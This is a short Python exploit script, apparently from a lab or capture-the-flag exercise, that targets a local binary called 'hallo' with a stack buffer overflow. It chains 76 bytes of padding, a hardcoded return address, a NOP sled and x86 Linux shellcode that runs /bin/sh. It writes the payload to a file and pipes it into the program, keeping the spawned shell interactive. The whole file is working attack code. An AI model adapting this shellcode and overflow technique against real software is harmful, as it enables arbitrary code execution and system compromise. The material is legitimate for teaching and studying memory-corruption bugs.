import struct
import os

padding = 'A' * 76

adresse = struct.pack("I", 0xbffffcf0)

nops = "\x90"*50

#shellcode = "\xcc\xcc\xcc\xcc"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

payload = padding + adresse + nops + shellcode

os.system("echo " + payload+ "> payload.txt")

#os.system("./hallo < payload.txt")
os.system("(cat payload.txt; cat) | ./hallo")